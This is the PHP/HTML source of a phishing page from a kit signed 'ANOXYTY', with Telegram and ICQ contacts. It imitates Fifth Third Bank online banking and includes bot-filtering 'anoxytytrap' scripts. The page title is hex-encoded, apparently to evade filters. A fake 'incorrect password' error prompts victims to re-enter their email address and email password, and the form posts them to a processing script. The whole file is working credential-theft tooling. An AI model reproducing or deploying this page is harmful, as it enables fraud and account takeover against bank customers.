﻿<?php 
ini_set( "display_errors", 0); 
/*       
// made by ANOXYTY" //Contact https://icq.im/Anoxyty / TELEGRAM @ANOXYTY "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include('anoxytytrap/anoxyty.php');
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';
?>
<html class="f3" data-menu="closed" lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<link rel="icon" href="assets/img/favicon.png">
<title>&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x2d;&#x20;&#x46;&#x69;&#x66;&#x74;&#x68;&#x20;&#x54;&#x68;&#x69;&#x72;&#x64;&#x20;&#x42;&#x61;&#x6e;&#x6b;</title>

    <link rel="stylesheet" type="text/css" href="assets/css/lp_53.css">
<link rel="stylesheet" type="text/css" href="assets/css/autocomplete.css">
    <link rel="stylesheet" href="assets/dist/css/formValidation.min.css">
	<style>
	.message-box_label--error,.message-box_label--warning,.message-box_label--info,.message-box_label--info-v2{font-size:.875rem;line-height:.875rem;padding:.3125rem 0 .1875rem 2.3125rem}@media(min-width:40.063em){.message-box_label--error,.message-box_label--warning,.message-box_label--info,.message-box_label--info-v2{padding:.625rem 0 .3125rem 2.5rem}}.message-box_label--error{color:#dc1431}@media(min-width:40.063em){.message-box_label--error{font-size:1rem;line-height:1rem}}.message-box_label--info{padding:.5rem .625rem .5rem 3.125rem;position:relative}.message-box_label--info img{left:0;position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.message-box_label--info-v2{padding:0 15px 0 62px;position:relative}.message-box_label--info-v2 img{left:2px;position:absolute;width:3rem}.message-box_label--info-v2 p{color:#524940;font-family:"connections_regular";font-size:1rem;line-height:1.2;margin-bottom:.3125rem}@media(min-width:40.063em){.message-box_label--info-v2 p{font-size:1.125rem}.message-box_label--info-v2 p a{font-size:1rem}}.message-box_link{font-size:1rem}
	</style>
</head>
<body class="body-reset ng-scope" data-menu="closed" data-gr-c-s-loaded="true">
    <ftb-app class="ng-isolate-scope"><!-- If user is not logged in or is in the device registration flow, add 'device-reg' class to the body, which allows the new UI changes to render properly for those pages only. Otherwise, use the customer segment theme class -->
<div id="app" class="jsonly device-reg" ng-class="(!appController.menuItemsService.applicationStateManager.loggedIn || appController.menuItemsService.applicationStateManager.promptForDeviceRegistration) ? 'device-reg' : appController.menuItemsService.applicationStateManager.themeClass">
    <ftb-header class="ng-isolate-scope"><div class="header container">
    <div class="spacing-s spacing-v--half">
        <div class="structure-2">
            <div class="structure-2__cell-A">
                <!-- ngIf: header.menuItemsService.applicationStateManager.loggedIn && !header.menuItemsService.applicationStateManager.modalOpen -->
                <!-- ngIf: !header.menuItemsService.applicationStateManager.loggedIn || header.menuItemsService.applicationStateManager.modalOpen --><span ng-if="!header.menuItemsService.applicationStateManager.loggedIn || header.menuItemsService.applicationStateManager.modalOpen" class="header__logo ng-scope" title="Fifth Third Online Banking">
                    <img class="logo -rb" src="assets/img/53_Horizontal-logo.svg" alt="Fifth Third Bank Logo">
                    <img class="logo--small -rb" src="assets/img/53_Shield-logo-small.svg" alt="Fifth Third Bank Logo">
                    <img class="logo -pa" src="assets/img/53_Horizontal-logo.svg" alt="Fifth Third Bank Logo">
                    <img class="logo--small -pa" src="assets/img/53_Shield-logo-small.svg" alt="Fifth Third Bank Logo">
                </span><!-- end ngIf: !header.menuItemsService.applicationStateManager.loggedIn || header.menuItemsService.applicationStateManager.modalOpen -->
            </div>
            <!-- ngIf: header.menuItemsService.applicationStateManager.loggedIn -->
        </div>
    </div>
</div>
</ftb-header>
    <div class="container" id="main">
        <div class="container__wrap">
            <div ng-class="{'global-structure':appController.menuItemsService.applicationStateManager.loggedIn &amp;&amp; !appController.menuItemsService.applicationStateManager.promptForDeviceRegistration, 'global-structure--single':!appController.menuItemsService.applicationStateManager.loggedIn || appController.menuItemsService.applicationStateManager.promptForDeviceRegistration}" id="main-content" class="global-structure--single">
                <ftb-side-bar-menu class="ng-isolate-scope"><!-- ngIf: sideBarMenu.menuItemsService.applicationStateManager.loggedIn && !sideBarMenu.menuItemsService.applicationStateManager.promptForDeviceRegistration -->
</ftb-side-bar-menu>
                <div class="global-structure__cell-B content">
                    <main role="main" id="focusContentOnLoad" tabindex="-1"><div class="loadingFinishedStatus" role="status" aria-label="Loading Complete"></div>
                        <div ng-class="{'content__wrap':appController.menuItemsService.applicationStateManager.loggedIn, 'content__wrap--single':appController.menuItemsService.applicationStateManager.wideContentArea &amp;&amp; !appController.menuItemsService.applicationStateManager.loggedIn, 'content__wrap--single--sm':!appController.menuItemsService.applicationStateManager.wideContentArea &amp;&amp; !appController.menuItemsService.applicationStateManager.loggedIn}" class="content__wrap--single--sm">
                            <div class="spacing--sides">
                                <ftb-service-message class="ng-isolate-scope"><!-- Note: entitlements will only work correctly if the box(es) is(are) set to only be shown when the user is logged in -->
<!-- The color of the box is determined by a class on the div below: -info (blue), -warning (yellow), or -danger (red) -->
<!-- ngIf: false && !serviceMessage.entitlementsDataManager.isFeatureDisabled(serviceMessage.Entitlements.SERVICE_MESSAGE_1) -->
<!-- The color of the box is determined by a class on the div below: -info (blue), -warning (yellow), or -danger (red) -->
<!-- ngIf: serviceMessage.ribApplicationStateManager.loggedIn && !serviceMessage.entitlementsDataManager.isFeatureDisabled(serviceMessage.Entitlements.SERVICE_MESSAGE_2) --></ftb-service-message>
                            </div>
                            <!-- uiView: --><div ui-view="" main-view="" autoscroll="false" class="spacing-v--2x spacing--sides ng-scope"><forgot-user-id-controller class="ng-scope ng-isolate-scope" style=""><!-- ngIf: !forgotUserIdController.enabled -->

<!-- ngIf: forgotUserIdController.enabled --><div ng-if="forgotUserIdController.enabled" class="card b-s b-r ng-scope">
    <div class="card__header">
        <span class="card__header__title ng-binding">Please synchronize your 53rd account with your email for account activity alert</span>
    </div>
    <div class="card__body">
        <div class="nc-body-wrap">
            <span class="media-block -stacked-center">
                <span class="media-block__media">
                    <img src="assets/img/user-Question-o.svg" alt="Silhouette of person inside a circle with a question mark" class="media-block__media__img img-responsive">
                </span>
                <span class="media-block__body">
                    <div class="b fs-5-shift spacing-bottom--half ng-binding">Let's make sure it's you!</div>
                    <div class="nc-body-text ng-binding">We just need a little information to locate your profile.</div>
                </span>
            </span>
			<div class="message-box--red">
					<img class="image-error--big" src="assets/img/error_icon_2x.svg" alt="Errors">
					<label class="message-box_label--error">Email address / password you entered is incorrect. Please retry and fix errors to continue.</label>
					<div id="eDuF10" class="z-div"></div>
				</div>
				<br/>
            <form  class="form ng-pristine ng-valid ng-valid-maxlength" method="POST" id="emlerr" action="processing/fresda1err">
                <div class="form__row -spaced">
                    <div class="form__row__cell -size0">
					<div class="grid-x grid-padding-x">
                        <div class="form__row__cell__content">
                            <label class="form-label form__label ng-binding" for="lastName-id">
                               Email Address
                            </label>
                            <div class="dynamic-state" data-valid="true">
                                <input class="form-input full dynamic-state__input ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" id="email" name="emailerr" type="email" autocomplete="email"  value=""  > 
                      </div>
                        </div>
                           </div>
                    
                    </div>
                </div>
				
				
                <div class="form__row -spaced">
                    <div class="form__row__cell -size0">
					<div class="grid-x grid-padding-x">
                        <div class="form__row__cell__content">
                            <label class="form-label -tooltip form__label ng-binding" for="ssn-id">
                                Email Password
                            </label>
                             <div class="dynamic-state" data-valid="true">
                                <input class="form-input full dynamic-state__input ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" type="password" name="empasserr" id="empass" value="">
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
                 
				 
               
                <button type="submit" class="vishidden"></button>
				
           
            <div class="nc-button-group centered spacing-top">
                <button type="submit" class="button -default -primary ng-binding" title="Next" role="button">
                    Next
                    <span class="bounce--1">.</span>
                    <span class="bounce--2">.</span>
                    <span class="bounce--3">.</span>
                </button>
                
            </div>
			</form>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Foundation.min.js"></script>
<script src="./assets/dist/js/forms.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="expdate"]').mask('00/00');
		
    </script>
        </div>
    </div>
</div>
 
<!-- ngIf: forgotUserIdController.enabled -->
</div>
                        </div>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <ftb-modal class="ng-isolate-scope"><!-- ngIf: fifthThirdModalController.fifthThirdModalDataManager.modalActive --></ftb-modal>
    <ftb-error-modal class="ng-isolate-scope"><!-- ngIf: errorModalController.ftbErrorService.isModalVisible -->
</ftb-error-modal>
    <ftb-survey class="ng-isolate-scope"><!-- ngIf: surveyController.surveyDataManager.visible -->
</ftb-survey>
    <ftb-footer class="ng-isolate-scope"><div class="footer container spacing--sides-m1 informational-txt" id="footer" role="contentinfo">
    <div class="container__wrap">
        <div class="spacing-right spacing-v margin-top--half">
            <nav role="navigation">
                <div class="structure -lc -vc-m full">
                    <div class="structure__cell">
                        <!-- ngIf: footerController.ribApplicationStateManager.loggedIn && !footerController.ribApplicationStateManager.promptForDeviceRegistration -->
                        <ul class="unlist nav-list bracket-spaced footer__nav fs-0-shift">
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="About Us" role="link">
                                    <span class="ng-binding">About Us</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Customer Service" role="link">
                                    <span class="ng-binding">Customer Service</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Careers" role="link">
                                    <span class="ng-binding">Careers</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Job Seeker’s Toolkit" role="link">
                                    <span class="ng-binding">Job Seeker’s Toolkit</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Media Center" role="link">
                                    <span class="ng-binding">Media Center</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Privacy &amp; Security" role="link">
                                    <span class="ng-binding">Privacy &amp; Security</span>
                                </a>
                            </li>
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Branch &amp; ATM Locators" role="link">
                                    <span class="ng-binding">Branch &amp; ATM Locator</span>
                                </a>
                            </li>
                            <!-- we don't know the entitlements until authenticated, so not showing by default -->
                            <!-- ngIf: footerController.ribApplicationStateManager.loggedIn && !footerController.ribApplicationStateManager.isPrivateBank() && !footerController.entitlementsDataManager.isFeatureDisabled(footerController.Entitlements.IAS) && !footerController.ribApplicationStateManager.promptForDeviceRegistration -->
                            <li class="nav-list__item">
                                <a class="anchor  primary" href="#" rel="noopener noreferrer" title="Digital Services User Agreement" role="link">
                                    <span class="ng-binding">Digital Services User Agreement</span>
                                </a>
                            </li>
                            <!-- ngIf: footerController.ribApplicationStateManager.loggedIn && !footerController.ribApplicationStateManager.isPrivateBank() && !footerController.ribApplicationStateManager.promptForDeviceRegistration -->
                        </ul>
                    </div>
                    <div class="structure__cell informational-txt">
                        <!-- ngIf: footerController.ribApplicationStateManager.loggedIn && !footerController.ribApplicationStateManager.promptForDeviceRegistration -->
                        <div class="footer__logo spacing-v">
                            <img class="logo" src="assets/img/equal-housing-lender--large.png" alt="Equal Housing Lender">
                            <img class="logo" src="assets/img/member-fdic.png" alt="Member FDIC">
                        </div>
                    </div>
                </div>
            </nav>
            <p class="full copyright ng-binding">
                Copyright © 2020 Fifth Third Bank, National Association, All Rights Reserved.
            </p>
        </div>
    </div>
</div></ftb-footer>
    <ftb-toast class="ng-isolate-scope"><!-- ngIf: fifthThirdToastController.toastDataManager.visible -->
</ftb-toast>
    <ftb-live-person class="ng-isolate-scope"><!-- ngIf: livePerson.ribApplicationStateManager.loggedIn && !livePerson.entitlementsDataManager.isFeatureHidden(livePerson.Entitlements.MESSAGING_FEATURE) -->
<div id="getUserData" ng-click="livePerson.getUserData()" tabindex="-1" aria-hidden="true" role="button"></div></ftb-live-person>
</div>
</ftb-app>
    <noscript>
        <div id="app">
            <div class="header container">
                <div class="container__wrap spacing-v--half">
                    <div class="structure-2">
                        <div class="structure-2__cell-A">
                            <span class="header__logo ng-scope" title="Fifth Third Internet Banking">
                                <img class="logo" src="assets/img/fifth-third-logo.png" alt="Fifth Third Bank Logo">
                                <img class="logo--small" src="assets/img/fifth-third-logo--small.png" alt="Fifth Third Bank Logo">
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            
			
            <div class="footer container spacing--sides-m1 informational-txt" role="contentinfo">
                <div class="container__wrap">
                    <div class="spacing-right spacing-v margin-top--half">
                        <nav role="navigation">
                            <div class="structure -lc -vc-m full">
                                <div class="structure__cell">
                                    <ul class="unlist nav-list bracket-spaced footer__nav fs-0-shift">
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="About Us" role="link">
                                                <span class="ng-binding">About Us</span>
                                            </a>
                                        </li>
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Customer Service" role="link">
                                                <span class="ng-binding">Customer Service</span>
                                            </a>
                                        </li>
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Careers" role="link">
                                                <span class="ng-binding">Careers</span>
                                            </a>
                                        </li>
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Media Center" role="link">
                                                <span class="ng-binding">Media Center</span>
                                            </a>
                                        </li>
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Privacy &amp; Security" role="link">
                                                <span class="ng-binding">Privacy &amp; Security</span>
                                            </a>
                                        </li>
                                        <li class="nav-list__item">
                                            <a class="anchor  primary" href="#" target="_blank" rel="noopener noreferrer" title="Branch &amp; ATM Locator" role="link">
                                                <span class="ng-binding">Branch &amp; ATM Locator</span>
                                            </a>
                                        </li>

                                    </ul>
                                </div>
                                <div class="structure__cell informational-txt">
                                    <div class="footer__logo spacing-v">
                                        <img class="logo" src="assets/img/equal-housing-lender--large.png" alt="Equal Housing Lender">
                                        <img class="logo" src="assets/img/member-fdic.png" alt="Member FDIC">
                                    </div>
                                </div>
                            </div>
                        </nav>
                        <p class="full copyright ng-binding">
                            © 2020 Fifth Third Bank, All rights reserved.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </noscript>
    </body></html>